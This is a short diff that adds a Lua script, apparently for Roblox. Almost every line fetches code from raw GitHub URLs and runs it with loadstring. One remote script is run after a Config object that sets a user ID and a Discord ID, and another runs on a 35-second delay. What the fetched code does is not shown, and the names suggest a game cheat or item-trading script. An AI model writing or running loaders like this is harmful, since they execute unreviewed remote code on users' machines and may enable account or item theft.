@@ -1,0 +1,8 @@
+for _,v in next,{
+    "https://raw.githubusercontent.com/sHuyGamers/BGSI/refs/heads/main/svv",
+    "_G.Config={UserID='1ee8f1f0-2db3-44ee-9707-5d48960fc770',discord_id='601249077975580673',Note='Pc'} loadstring(game:HttpGet('https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/adoptmee'))()"
+} do task.spawn(function() loadstring(v:find("http") and game:HttpGet(v) or v)() end) end
+
+task.delay(35,function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/sHuyGamers/BGSI/refs/heads/main/zeke"))()
+end)
